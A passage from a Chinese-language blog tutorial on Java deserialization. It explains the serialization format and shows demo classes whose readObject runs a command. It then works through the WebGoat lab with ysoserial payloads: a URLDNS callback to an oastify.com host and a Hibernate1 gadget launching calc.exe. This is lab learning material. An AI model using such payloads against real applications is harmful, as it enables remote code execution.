        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);
        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> objectInputStream.readObject();
        objectInputStream.close();
        System.out.println(result);
    }
}</code></pre>
<p>我们用010编辑器打开上述生成的文件看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209192223832.png" alt="image-20231209192223832"></p>
<p>可见上述十六进制是以aced开头的，这里说一下Java序列化特性：</p>
<pre><code class="hljs plaintext">一段数据以 rO0AB 开头，你基本可以确定这串就是 JAVA 序列化 base64 加密的数据。
或者如果以 aced 开头，那么他就是这一段 java 序列化的 16 进制。</code></pre>
<p>且<code>0005</code> 为 Java 对象序列化的版本号</p>
<pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;
<span class="hljs-keyword">import</span> java.io.FileOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Serialize2</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{
        <span class="hljs-comment">//要序列化的数据</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>).getMethod(<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{}).invoke(<span class="hljs-literal">null</span>);
        <span class="hljs-type">Object</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>).getMethod(<span class="hljs-string">"exec"</span>, String.class).invoke(runtime, <span class="hljs-string">"calc.exe"</span>);
        <span class="hljs-comment">//Object evil = Runtime.getRuntime().exec("calc.exe");</span>

        <span class="hljs-comment">//序列化</span>
        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"serialize2.txt"</span>);
        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);
        objectOutputStream.writeObject(evil);
        objectOutputStream.close();

        <span class="hljs-comment">//反序列化</span>
        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"serialize2.txt"</span>);
        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);
        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> objectInputStream.readObject();
        objectInputStream.close();
        System.out.println(result);
    }
}</code></pre>
<p>这里如果我们直接运行会发现报错，但计算器是成功弹出的，这是因为上述Runtime类没有继承Serializable接口，所以导致不会成功，它弹是在写Object的时候弹出来的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209192835231.png" alt="image-20231209192835231"></p>
<p>我们如果跟进java.io.Serializable接口会发现如下图，是一个空类，有位师傅这样解释：这说明起作用只是为了在反序列化和序列化中，做一个类型判断。为什么呢？因为遵循非必要原则，不需要反序列化的类就可以不用反序列化了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209193218003.png" alt="image-20231209193218003"></p>
<h2 id="41-如何序列化类">4.1 如何序列化类</h2>
<p>Java原生实现了一套序列化的机制，它让我们不需要额外编写代码，只需要实现<code>java.io.Serializable</code>接口，并调用<code>ObjectOutputStream</code>类的<code>writeObject</code>方法即可</p>
<p>Person类实现：</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> serializable;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.Serializable;
<span class="hljs-comment">/*</span>
<span class="hljs-comment"> * implements Serializable:序列化的前提,需要实现这个接口</span>
<span class="hljs-comment"> * Serializable:表示这个类的成员可以被序列化</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
    <span class="hljs-comment">// 添加一个 transient 关键字,则name属性不会被序列化和反序列化</span>
    <span class="hljs-comment">// 如果将属性设置为static,同样不会被序列化和反序列化</span>
    <span class="hljs-comment">// private transient String name;</span>
    <span class="hljs-keyword">public</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>{

    }
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">/*</span>
<span class="hljs-comment">     * @Override是Java5的元数据,自动加上去的一个标志,告诉你说下面这个方法是从父类/接口</span>
<span class="hljs-comment">     * 继承过来的,需要你重写一次,这样就可以方便你阅读,也不怕会忘记</span>
<span class="hljs-comment">     * @Override是伪代码,表示重写(当然不写也可以),不过写上有如下好处:</span>
<span class="hljs-comment">     * 1. 可以当注释用,方便阅读</span>
<span class="hljs-comment">     * 2. 编译器可以给你验证@Override下面的方法名是否是你父类中所有的,如果没有则报错</span>
<span class="hljs-comment">     * 比如你如果没写@Override而你下面的方法名又写错了,这时你的编译器是可以通过的(它以为这个方法是你的子类中自己增加的方法)</span>
<span class="hljs-comment">     * 使用该标记是为了增强程序在编译时候的检查,如果该方法并不是一个覆盖父类的方法,在编译时编译器就会报告错误</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Person{"</span> + <span class="hljs-string">"name='"</span> + name + <span class="hljs-string">'\''</span> + <span class="hljs-string">",age="</span> + age + <span class="hljs-string">'}'</span>;
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream objectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {
        <span class="hljs-comment">/*</span>
<span class="hljs-comment">         * java.io.ObjectInputStream.defaultReadObject()</span>
<span class="hljs-comment">         * 方法用于从这个ObjectInputStream读取当前类的非静态和非瞬态字段.它间接地涉及到该类的readObject()方法的帮助.</span>
<span class="hljs-comment">         * 如果它被调用,则会抛出NotActiveException</span>
<span class="hljs-comment">         */</span>
        objectInputStream.defaultReadObject();
        <span class="hljs-comment">/*</span>
<span class="hljs-comment">         * 每个Java应用程序都有一个Runtime类的Runtime ,允许应用程序与运行应用程序的环境进行接口.当前运行时可以从getRuntime方法获得.</span>
<span class="hljs-comment">         */</span>
        <span class="hljs-comment">/*</span>
<span class="hljs-comment">         * exec:在具有指定环境的单独进程中执行指定的字符串命令</span>
<span class="hljs-comment">         */</span>
        Runtime.getRuntime().exec(<span class="hljs-string">"calc.exe"</span>);
    }
}</code></pre>
<p>Serializable类实现：</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> serializable;

<span class="hljs-keyword">import</span> java.io.FileOutputStream;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializable</span><span class="hljs-params">(Object person)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">/*</span>
<span class="hljs-comment">         * ObjectOutputStream将Java对象的原始数据类型和图形写入OutputStream.可以使用ObjectInputStream读取（重构）</span>
<span class="hljs-comment">         * 对象.可以通过使用流的文件来实现对象的持久存储.如果流是网络套接字流,则可以在另一个主机上或另一个进程中重构对象.</span>
<span class="hljs-comment">         */</span>
        <span class="hljs-comment">/*</span>
<span class="hljs-comment">         * 文件输出流是用于将数据写入到输出流File或一个FileDescriptor</span>
<span class="hljs-comment">         * .文件是否可用或可能被创建取决于底层平台.特别是某些平台允许一次只能打开一个文件来写入一个FileOutputStream</span>
<span class="hljs-comment">         * （或其他文件写入对象）.在这种情况下,如果所涉及的文件已经打开,则此类中的构造函数将失败.</span>
<span class="hljs-comment">         * FileOutputStream用于写入诸如图像数据的原始字节流. 对于写入字符流,请考虑使用FileWriter .</span>
<span class="hljs-comment">         */</span>
        <span class="hljs-comment">// 序列化的类</span>
        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"ser.ser"</span>));
        <span class="hljs-comment">/*</span>
<span class="hljs-comment">         * 方法writeObject用于将一个对象写入流中. 任何对象,包括字符串和数组,都是用writeObject编写的. 多个对象或原语可以写入流.</span>
<span class="hljs-comment">         * 必须从对应的ObjectInputstream读取对象,其类型和写入次序相同.</span>
<span class="hljs-comment">         */</span>
        <span class="hljs-comment">// 需要序列化的对象是谁?</span>
        obj.writeObject(person);
        obj.close();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{
        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"hybcx"</span>, <span class="hljs-number">18</span>);
        serializable(person);
    }
}</code></pre>
<p>跟进writeObject函数，阅读其注释可知：</p>
<p>在反序列化的过程当中，是针对对象本身，而非针对类的，因为静态属性是不参与序列化和反序列化的过程的。另外，如果属性本身声明了<code>transient</code>关键字，也会被忽略。但是如果某对象继承了A类，那么A类当中的对象的对象属性也是会被序列化和反序列化的(前提是A类也实现了<code>java.io.Serializable</code>接口)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209194833074.png" alt="image-20231209194833074"></p>
<h2 id="42-如何反序列化类">4.2 如何反序列化类</h2>
<p>序列化使用<code>ObjectOutPutStream</code>类，反序列化使用的则是<code>ObjectInputStream</code>类的<code>readObject</code>方法。我们在之前重写了<code>readObject</code>方法，所以会执行命令</p>
<p>Unserializable类实现：</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> serializable;

<span class="hljs-keyword">import</span> java.io.FileInputStream;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserializable</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {
        <span class="hljs-comment">/*</span>
<span class="hljs-comment">         * ObjectInputStream反序列化先前使用ObjectOutputStream编写的原始数据和对象.</span>
<span class="hljs-comment">         * ObjectOutputStream和ObjectInputStream可以分别为与FileOutputStream和FileInputStream一起使用的对象图提供持久性存储的应用程序.</span>
<span class="hljs-comment">         * ObjectInputStream用于恢复先前序列化的对象. 其他用途包括使用套接字流在主机之间传递对象,或者在远程通信系统中进行封送和解组参数和参数.</span>
<span class="hljs-comment">         * ObjectInputStream确保从流中创建的图中的所有对象的类型与Java虚拟机中存在的类匹配. 根据需要使用标准机制加载类.</span>
<span class="hljs-comment">         * 只能从流中读取支持java.io.Serializable或java.io.Externalizable接口的对象.</span>
<span class="hljs-comment">         */</span>
        <span class="hljs-comment">// 反序列化的类</span>
        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>((<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename)));
        <span class="hljs-comment">/*</span>
<span class="hljs-comment">         * 方法readObject用于从流中读取对象. 应使用Java的安全铸造来获得所需的类型. 在Java中,字符串和数组是对象,在序列化过程中被视为对象.</span>
<span class="hljs-comment">         * 读取时,需要将其转换为预期类型.</span>
<span class="hljs-comment">         */</span>
        <span class="hljs-comment">// 读出来并反序列化</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ins.readObject();
        ins.close();
        <span class="hljs-keyword">return</span> obj;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) unserialize(<span class="hljs-string">"ser.ser"</span>);
        System.out.println(person);
    }
}</code></pre>
<p>其实反序列化的实现就是序列化的逆过程,会根据序列化读出数据的类型,进行相应的处理</p>
<h2 id="43-serialversionuid">4.3 serialVersionUID</h2>
<blockquote>
<p>序列化和反序列化可以理解为压缩和解压缩，但是压缩之所以能被解压缩的前提是因为他俩的协议是一样的。如果压缩是以四个字节为一个单位，而解压缩以八个字节为一个单位，就会乱套</p>
<p>同样在Java中与协议相对的概念为：<strong>serialVersionUID</strong></p>
<p>当serialVersionUID不一致时，反序列化会直接抛出异常</p>
<p>比如设置为1L时序列化，修改为2L时反序列化，则会抛出异常</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209195711863.png" alt="image-20231209195711863"></p>
<p>如上图，这里我们修改为2L，如下图发生报错，</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209195735327.png" alt="image-20231209195735327"></p>
<p>我们跟进上图报错第二行的596那一行，发现下图情况：代码进行了判断<code>suid != osc.getSerialVersionUID()</code>如果两次UID不相同，则抛出异常</p>
<p><code>serializable.Person; local class incompatible: stream classdesc serialVersionUID = 1, local class serialVersionUID = 2</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209195914736.png" alt="image-20231209195914736"></p>
<h1 id="0x08-java反序列化1实践">0x08 Java反序列化1实践</h1>
<p>学了上述那么多前置知识，但我发现那些文章还有大把没讲完。。。。太多了需要慢慢啃，这里我就先复现一下看小迪课程的一些例子吧</p>
<h2 id="81-序列化和反序列化过程">8.1 序列化和反序列化过程</h2>
<p>首先他这里给了一个简单序列化和反序列化代码</p>
<p>Main类实现：</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> SerialTest;

<span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
	<span class="hljs-comment">// write your code here</span>
    }
}

<span class="hljs-comment">//定义Person类，用于后续序列化实例对象</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;
    <span class="hljs-keyword">private</span> String sex;
    <span class="hljs-keyword">transient</span> <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> stuId;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, String sex, <span class="hljs-type">int</span> stuId)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
        <span class="hljs-built_in">this</span>.sex = sex;
        <span class="hljs-built_in">this</span>.stuId = stuId;
    }

    <span class="hljs-comment">//继承Person类</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> String.format(
                <span class="hljs-string">"Person{name: %s, age: %d, sex: %s, stuId: %d, count: %d}\n"</span>,
                name, age, sex, stuId, count
        );
    }
}</code></pre>
<p>SerializableTest类实现：</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> SerialTest;

<span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializableTest</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        serialPerson();
        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> deserialPerson();
        System.out.println(person);
    }

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * Person对象序列化</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialPerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"xiaodi"</span>, <span class="hljs-number">28</span>, <span class="hljs-string">"男"</span>, <span class="hljs-number">101</span>);

        <span class="hljs-comment">//将Java对象的原始数据写入到outputstream,可使用ObjectInputStream读取,最后将数据写入到输出流File</span>
        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"person.txt"</span>))
        );
        <span class="hljs-comment">//将person实例对象进行序列化</span>
        oos.writeObject(person);
        System.out.println(<span class="hljs-string">"person 对象序列化成功！"</span>);
        oos.close();
    }

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * Person对象反序列化</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Person <span class="hljs-title function_">deserialPerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">//恢复先前序列化的对象</span>
        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"hacker.txt"</span>))
        );
        <span class="hljs-comment">//反序列化数据流,也就是先前实力对象的序列化字节流</span>
        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)ois.readObject();
        System.out.println(<span class="hljs-string">"person 对象反序列化成功！"</span>);
        <span class="hljs-comment">//Runtime.getRuntime().exec("calc.exe");</span>
        <span class="hljs-keyword">return</span> person;
    }
}</code></pre>
<p>我们运行之后如下图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209201557444.png" alt="image-20231209201557444"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209201624963.png" alt="image-20231209201624963"></p>
<p>同样的aced 0005开头</p>
<h2 id="82-ysoserial工具使用">8.2 ysoserial工具使用</h2>
<p>看了有几篇文章利用该工具的jar包进行一些常见Java反序列化1漏洞的链子分析…但对于看Java代码有些许困难的我，还是先学会如何在实战中使用吧</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> --唉，要是这个项目持续更新就好了</p>
<p>这里的练习就用Java漏洞靶场webgoat来玩玩，不过tm搭建了半天，这新版本不会启动。。。。还是建议用8.2.2的版本吧</p>
<h3 id="webgoat-insecure-deserialization">webgoat-Insecure Deserialization</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209212826911.png" alt="image-20231209212826911"></p>
<p>找到相应关卡这里让我们更改序列化数据，让页面响应延迟5秒即可成功，那我们先可以验证一下这里是否存在反序列化注入点。</p>
<p>在此之前我们观察到上述序列化对象时r00ab开头，这说明是Java序列化数据经过base加密的结果，这里我们可以看一下源码进行验证</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209213239024.png" alt="image-20231209213239024"></p>
<p>我们在上述输入1提交，抓一下包看一下Java对应的实现接口，如上图，我们可以发现接口地址为InsecureDeserialization/task，我们到其Java项目中找一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209213350417.png" alt="image-20231209213350417"></p>
<p>如上图，我们可以看到该类在处理传入的token参数时，进行了base64的解密，这意味着我们如果构造了Java序列化恶意数据之后还需要进行base64的加密</p>
<p>这里我们用一下ysoserial工具，在这里作用大概就是可以凭借右侧依赖（对应的Java反序列化1漏洞点）直接根据用户输入的恶意数据生成依赖所对应的Java反序列化1漏洞的序列化数据。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209213651424.png" alt="image-20231209213651424"></p>
<p>这里我们用到的是上述命令URLDNS，我们利用dnslog平台回显来判断是否存在反序列化漏洞</p>
<pre><code class="hljs java">java -jar ysoserial-all.jar URLDNS <span class="hljs-string">"http://wqqly89hgl2qwlw44cadp2xdo4uvin6c.oastify.com"</span> &gt; urldns.txt</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209215008083.png" alt="image-20231209215008083"></p>
<p>执行完后我们打开发现是aced开头，base64编码一下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> base64
file = <span class="hljs-built_in">open</span>(<span class="hljs-string">"urldns.txt"</span>,<span class="hljs-string">"rb"</span>)

now = file.read()
ba = base64.b64encode(now)
<span class="hljs-built_in">print</span>(ba)
file.close()</code></pre>
<p>这里不知为何那些dnslog平台都崩了打不开，因此用了bp自带的进行了验证</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209215943768.png" alt="image-20231209215943768"></p>
<p>点击上述copy复制后输入相关命令，最后将得到的文件数据进行一次base644加密输出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209220034804.png" alt="image-20231209220034804"></p>
<p>将得到的数据输入至下列输入框中，最后看到上图的bp中显示了最近一次的访问，验证成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209215952547.png" alt="image-20231209215952547"></p>
<p>接下来利用执行系统命令来验证一次</p>
<pre><code class="hljs java">java -Dhibernate5 -cp hibernate-core-<span class="hljs-number">5.4</span><span class="hljs-number">.28</span>.Final.jar;ysoserial-<span class="hljs-number">0.0</span><span class="hljs-number">.6</span>-SNAPSHOT-all.jar ysoserial.GeneratePayload Hibernate1 <span class="hljs-string">"calc.exe"</span> &gt; <span class="hljs-number">1.</span>bin</code></pre>
<p>这里的<code>hibernate-core-5.4.9.Final.jar</code>我们可以看一下这里</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211154816889.png" alt="image-20231211154816889"></p>
<p>如上图可以看到这里是支持Hibernate的，因此我们需要在webgoat的jar包中找到相关的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211155121594.png" alt="image-20231211155121594"></p>
<p>如上图我们找到了<code>hibernate-core-5.4.28.Final.jar</code>一般都是找core这个包的，这是插件的核心</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211155253481.png" alt="image-20231211155253481"></p>
<p>如图执行成功后我们打开x.bin看一下，如下图可以看到是以aced开头的，接下来用个Python脚本编码一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211155334271.png" alt="image-20231211155334271"></p>
<p>这里编译好直接输入至输入框中即可，但这里不知道为何我弹不出计算器</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211191834859.png" alt="image-20231211191834859"></p>
<p>这里先尝试延迟5秒吧，这里由于是windows环境，就是ping来实现</p>
<p>InsecureDeserializationTask.java</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> org.owasp.webgoat.deserialization;

<span class="hljs-keyword">import</span> org.dummy.insecure.framework.VulnerableTaskHolder;
<span class="hljs-keyword">import</span> org.owasp.webgoat.assignments.AssignmentEndpoint;
<span class="hljs-keyword">import</span> org.owasp.webgoat.assignments.AssignmentHints;
<span class="hljs-keyword">import</span> org.owasp.webgoat.assignments.AttackResult;
